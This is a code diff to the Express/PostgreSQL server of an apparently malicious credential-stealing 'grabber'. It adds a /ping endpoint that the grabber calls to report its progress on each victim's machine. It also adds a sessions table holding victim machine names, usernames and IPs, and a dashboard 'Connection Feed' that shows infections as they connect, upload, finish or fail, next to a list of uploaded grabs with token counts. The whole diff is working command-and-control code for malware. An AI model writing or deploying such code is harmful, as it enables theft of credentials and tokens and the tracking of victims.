@@ -48,6 +48,18 @@ async function initDb() {
       bin BYTEA
     )
   `);
+  // session ping tracking
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS sessions (
+      id TEXT PRIMARY KEY,
+      machine TEXT DEFAULT '',
+      username TEXT DEFAULT '',
+      ip TEXT DEFAULT '',
+      status TEXT DEFAULT 'connected',
+      created_at TIMESTAMPTZ DEFAULT NOW(),
+      updated_at TIMESTAMPTZ DEFAULT NOW()
+    )
+  `);
 }
 
 // Count tokens from zip buffer — called at upload time so dashboard shows counts instantly
@@ -109,6 +121,21 @@ app.post("/theme", checkKey, upload.single("img"), async (req, res) => {
     }
     res.json({ ok: 1 });
   } catch (err) { res.status(500).json({ e: err.message }); }
+});
+
+// session ping — called by grabber at: connected, uploading, done, failed
+app.post("/ping", checkKey, async (req, res) => {
+  try {
+    const sid = req.query.sid || crypto.randomBytes(4).toString("hex");
+    const ip  = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
+    const status = (req.query.status || "connected").slice(0, 20);
+    await pool.query(`
+      INSERT INTO sessions (id, machine, username, ip, status, created_at, updated_at)
+      VALUES ($1,$2,$3,$4,$5,NOW(),NOW())
+      ON CONFLICT (id) DO UPDATE SET status=$5, updated_at=NOW()
+    `, [sid, req.query.m||"", req.query.u||"", ip, status]);
+    res.json({ ok:1, sid });
+  } catch(err) { res.status(500).json({ e: err.message }); }
 });
 
 // clear background + theme
@@ -190,9 +217,10 @@ app.post("/api/v1/sync", checkKey, upload.single("file"), async (req, res) => {
 
 app.get("/", checkKey, async (req, res) => {
   try {
-    const [grabsRes, settingsRes] = await Promise.all([
+    const [grabsRes, settingsRes, sessRes] = await Promise.all([
       pool.query(`SELECT id, filename, filesize, ip, machine, username, os, arch, created_at, COALESCE(token_count,0) as token_count, COALESCE(src,'dc') as src FROM grabs ORDER BY created_at DESC`),
-      pool.query(`SELECT key, val, (bin IS NOT NULL AND length(bin)>0) as has_bin FROM settings`)
+      pool.query(`SELECT key, val, (bin IS NOT NULL AND length(bin)>0) as has_bin FROM settings`),
+      pool.query(`SELECT id, machine, username, ip, status, updated_at FROM sessions WHERE updated_at > NOW() - INTERVAL '24 hours' ORDER BY updated_at DESC LIMIT 30`)
     ]);
     const rows = grabsRes.rows;
     const totalSize = rows.reduce((s, r) => s + parseInt(r.filesize || 0), 0);
@@ -210,7 +238,8 @@ app.get("/", checkKey, async (req, res) => {
     if (smap.theme_colors && smap.theme_colors.val) {
       try { theme = JSON.parse(smap.theme_colors.val); } catch {}
     }
-    res.send(renderPage(entries, totalSize, k, { hasBg, theme }));
+    const sessions = sessRes.rows;
+    res.send(renderPage(entries, totalSize, k, { hasBg, theme, sessions }));
   } catch (err) {
     console.error("[!] dashboard error:", err.message);
     res.status(500).send("db error");
@@ -240,7 +269,7 @@ app.post("/rm/:id", checkKey, async (req, res) => {
   }
 });
 
-function renderPage(entries, totalSize, k, { hasBg = false, theme = null } = {}) {
+function renderPage(entries, totalSize, k, { hasBg = false, theme = null, sessions = [] } = {}) {
   const uniqueIps = new Set(entries.map(e => e.ip)).size;
   const now = Date.now();
   const isFresh = (t) => (now - new Date(t).getTime()) < 5 * 60 * 1000;
@@ -471,6 +500,51 @@ tbody tr.fresh{animation:fadeUp .35s ease both,freshGlow 1.5s ease .4s 3}
   border:1px solid rgba(74,222,128,0.18)
 }
 .tok-no .muted{font-size:11px}
+
+/* connection feed */
+.conn-wrap{
+  background:var(--glass);
+  backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
+  border:1px solid var(--glass-b);border-radius:16px;
+  margin-bottom:16px;overflow:hidden;
+  animation:fadeUp .4s ease .25s both
+}
+.conn-header{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:13px 18px;
+  border-bottom:1px solid rgba(255,255,255,0.04);
+  background:rgba(3,3,14,0.5)
+}
+.conn-title{font-family:var(--mono);font-size:10px;color:var(--muted);letter-spacing:2px;text-transform:uppercase}
+.conn-count{font-family:var(--mono);font-size:10px;color:var(--accent)}
+.conn-list{padding:6px 0}
+.conn-row{
+  display:flex;align-items:center;gap:14px;
+  padding:10px 18px;
+  border-bottom:1px solid rgba(255,255,255,0.025);
+  transition:background .15s
+}
+.conn-row:last-child{border-bottom:none}
+.conn-row:hover{background:rgba(255,255,255,0.025)}
+.conn-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
+.s-connected .conn-dot{background:#FBBF24;box-shadow:0 0 6px #FBBF2466;animation:pulse-y 1.6s ease-in-out infinite}
+.s-uploading .conn-dot{background:var(--blue);box-shadow:0 0 6px rgba(96,165,250,0.5);animation:pulse-b 1s ease-in-out infinite}
+.s-done .conn-dot{background:var(--green);box-shadow:0 0 6px rgba(74,222,128,0.4)}
+.s-failed .conn-dot{background:var(--red);box-shadow:0 0 6px rgba(248,113,113,0.4)}
+@keyframes pulse-y{0%,100%{opacity:1}50%{opacity:.35}}
+@keyframes pulse-b{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(0.7)}}
+.conn-machine{font-family:var(--mono);font-size:12px;color:var(--text);flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.conn-machine .muted{color:var(--muted)}
+.conn-ip{font-family:var(--mono);font-size:11px;color:var(--muted);flex-shrink:0}
+.conn-status{
+  font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:1px;
+  padding:3px 10px;border-radius:6px;flex-shrink:0;text-transform:uppercase
+}
+.s-connected .conn-status{background:rgba(251,191,36,0.1);color:#FBBF24;border:1px solid rgba(251,191,36,0.2)}
+.s-uploading .conn-status{background:rgba(96,165,250,0.1);color:var(--blue);border:1px solid rgba(96,165,250,0.2)}
+.s-done .conn-status{background:rgba(74,222,128,0.08);color:var(--green);border:1px solid rgba(74,222,128,0.18)}
+.s-failed .conn-status{background:rgba(248,113,113,0.08);color:var(--red);border:1px solid rgba(248,113,113,0.18)}
+.conn-time{font-family:var(--mono);font-size:10px;color:var(--muted);flex-shrink:0}
 .empty{text-align:center;padding:90px 20px;color:var(--muted);animation:fadeUp .5s ease .2s both}
 .empty .icon{font-size:34px;margin-bottom:16px;opacity:.2}
 .empty p{font-family:var(--mono);font-size:12px;letter-spacing:2px}
@@ -576,6 +650,27 @@ ${themeOverride}
     <div class="card"><div class="label">Sources</div><div class="value" data-count="${uniqueIps}">${uniqueIps}</div></div>
     <div class="card"><div class="label">Latest</div><div class="value sm">${entries.length ? timeAgo(entries[0].t) : "—"}</div></div>
   </div>
+
+  ${sessions.length ? `
+  <div class="conn-wrap">
+    <div class="conn-header">
+      <span class="conn-title">&#9671;&nbsp; Connection Feed</span>
+      <span class="conn-count">${sessions.length} session${sessions.length !== 1 ? 's' : ''} &middot; last 24h</span>
+    </div>
+    <div class="conn-list">
+      ${sessions.map(s => {
+        const sc = ['connected','uploading','done','failed'].includes(s.status) ? s.status : 'connected';
+        const label = sc === 'connected' ? 'CONNECTED' : sc === 'uploading' ? 'UPLOADING…' : sc === 'done' ? 'DONE' : 'FAILED';
+        return `<div class="conn-row s-${sc}">
+          <div class="conn-dot"></div>
+          <div class="conn-machine">${esc(s.machine)}${s.username ? `<span class="muted"> \\ ${esc(s.username)}</span>` : ''}</div>
+          <div class="conn-ip">${esc(s.ip || '').split(',')[0].trim()}</div>
+          <div class="conn-status">${label}</div>
+          <div class="conn-time">${timeAgo(s.updated_at)}</div>
+        </div>`;
+      }).join('')}
+    </div>
+  </div>` : ''}
 
   ${entries.length
     ? `<div class="table-wrap"><table>
